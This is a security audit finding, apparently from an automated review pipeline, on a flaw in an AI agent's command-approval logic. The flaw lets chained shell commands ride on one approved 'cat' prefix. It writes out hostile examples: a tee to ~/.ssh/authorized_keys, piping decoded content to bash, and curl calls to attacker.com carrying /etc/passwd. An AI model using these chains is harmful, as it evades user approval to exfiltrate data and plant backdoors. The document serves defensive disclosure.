Phase: 8
Sequence: 020
Slug: bash-pipe-semicolon-bypass
Verdict: VALID
Rationale: Tracer confirmed complete code path from LLM tool call through extractBashPrefix pipe-blindness to unrestricted bash -c execution; Advocate found zero blocking protections across all 5 defense layers.
Severity-Original: CRITICAL
PoC-Status: pending
Pre-FP-Flag: none
Debate: archon/chamber-workspace/chamber-B/debate.md

## Summary

The `extractBashPrefix` function in the agent approval system splits commands only on the pipe character `|` (approval.go:205) and completely ignores shell command separators `;`, `&&`, and `||`. Only the first pipe segment is analyzed for prefix matching. After a user approves a single benign command (e.g., `cat tools/a.go`), the LLM can issue commands with arbitrary pipe targets or semicolon-separated commands that are auto-approved and executed without user visibility.

This enables arbitrary file write (via `tee`), arbitrary code execution (via `| bash`), and data exfiltration (via `; curl`) after a single legitimate-looking approval.

## Location

- `x/agent/approval.go:205` -- `strings.Split(command, "|")` discards all pipe segments after first
- `x/agent/approval.go:217-222` -- `safeCommands` map includes `cat` but pipe targets (`tee`, `bash`) are unchecked
- `x/agent/approval.go:112-114` -- `denyPathPatterns` missing `.ssh/authorized_keys`
- `x/tools/bash.go:64` -- `exec.CommandContext(ctx, "bash", "-c", command)` executes full command string
- `x/cmd/run.go:404` -- `approval.IsAllowed` gates execution; when true, no user prompt

## Attacker Control

The LLM controls the full `command` string passed to the bash tool. After the user approves any command matching a prefix (e.g., `cat:tools/`), the LLM can craft subsequent commands with:
1. Pipe targets: `cat tools/a.go | tee ~/.ssh/authorized_keys`
2. Pipe chains: `cat tools/a.go | base64 -d | bash`
3. Semicolons: `cat tools/a.go; curl http://attacker.com/$(cat /etc/passwd | base64)`
4. Logical operators: `cat tools/a.go && curl attacker.com`

## Trust Boundary Crossed

User approval boundary. The user approved `cat` operations within a specific directory. The approval system extends this to arbitrary commands executed via pipe targets and command separators, crossing the scope the user intended to grant.

## Impact

- **Arbitrary file write**: `tee`, `>`, `>>` to any writable path including SSH authorized_keys, crontabs, shell profiles
- **Arbitrary code execution**: Pipe to `bash`, `sh`, `python3`, `perl`
- **Data exfiltration**: Semicolon-separated `curl`/`wget` GET requests (POST is denied but GET is not)
- **Persistent backdoor**: SSH key injection via `tee ~/.ssh/authorized_keys`

## Evidence

1. `approval.go:205`: `parts := strings.Split(command, "|")` -- only `|` is used as delimiter; `;` `&&` `||` are not handled
2. `approval.go:206`: `firstCmd := strings.TrimSpace(parts[0])` -- everything after first `|` is discarded
3. `approval.go:112-114`: denyPathPatterns lists `.ssh/id_rsa`, `.ssh/id_dsa`, `.ssh/id_ecdsa`, `.ssh/id_ed25519`, `.ssh/config` but NOT `.ssh/authorized_keys`
4. `approval.go:94-121`: denyPatterns lacks `tee`, `bash` (standalone), `sh` (standalone), `python3`, `perl`
5. `bash.go:64`: `cmd := exec.CommandContext(ctx, "bash", "-c", command)` -- full string passed to bash
6. `run.go:404`: `!approval.IsAllowed(toolName, args)` -- when IsAllowed returns true, RequestApproval is not called

## Reproduction Steps

1. Start an agent session (non-YoloMode)
2. Allow the LLM to execute a benign command: `cat tools/main.go` -- approve with "Allow for this session"
3. This stores prefix `cat:tools/` in the allowlist
4. The LLM now issues: `cat tools/main.go | tee /tmp/proof-of-concept`
5. `extractBashPrefix` analyzes only `cat tools/main.go` (before `|`), returns `cat:tools/`, matches stored prefix
6. Command auto-approved and executed -- `/tmp/proof-of-concept` is created
7. For RCE: `cat tools/main.go | bash` -- executes the Go source as a bash script (harmless in this case, but `cat tools/payload | base64 -d | bash` with crafted content = RCE)
8. For exfiltration: `cat tools/main.go; curl http://attacker.com/?data=$(whoami)` -- semicolon-separated, auto-approved

## Cold Verification

```
Adversarial-Verdict: CONFIRMED
Adversarial-Rationale: extractBashPrefix provably returns identical prefix for benign and malicious pipe/semicolon-augmented commands; IsDenied gaps allow tee, curl GET, and piped bash execution
Severity-Final: HIGH
PoC-Status: theoretical
```

### Code Path Trace (Independent)

1. `run.go:376-378`: `IsDenied()` checks full command against deny patterns -- passes for `tee`, `curl` GET, `| bash`
2. `run.go:404`: `approval.IsAllowed()` calls `extractBashPrefix()`
3. `approval.go:205-207`: `strings.Split(command, "|")` only splits on pipe; first segment extracted
4. `approval.go:215-284`: First segment checked against `safeCommands` map and path extracted
5. `approval.go:403-406`: Extracted prefix matched against stored prefixes -- matches `cat:tools/`
6. `IsAllowed` returns true, user prompt skipped
7. `bash.go:64`: `exec.CommandContext(ctx, "bash", "-c", command)` executes FULL command including pipe targets and semicolon-separated commands

### Protection Analysis

- `IsDenied` checks full command but has gaps: no deny for `tee`, `curl` GET, `| bash`, `| sh`, `| python3`
- `isCommandOutsideCwd` (line 314) DOES split on `|`, `;`, `&` -- proving developer awareness -- but is only used for warning display during `RequestApproval`, which is SKIPPED when `IsAllowed` returns true
- `.ssh/authorized_keys` is absent from `denyPathPatterns` (line 126-136)

### Functional Test

Independent reimplementation of `extractBashPrefix` confirms identical prefix `"cat:tools/"` for all variants:
- `cat tools/main.go` (benign)
- `cat tools/main.go | tee /tmp/proof` (file write bypass)
- `cat tools/main.go | bash` (code execution bypass)
- `cat tools/main.go; curl http://attacker.com/?d=x` (exfiltration bypass)
- `cat tools/main.go && curl http://attacker.com/?d=x` (exfiltration bypass)

### Severity Downgrade Rationale

Original CRITICAL downgraded to HIGH because:
- Requires active agent session (user must be running the tool)
- Requires user to have approved a benign command with "Allow for this session"
- Attack vector is LLM manipulation (prompt injection), not direct remote exploitation
- `IsDenied` provides partial protection against some dangerous operations
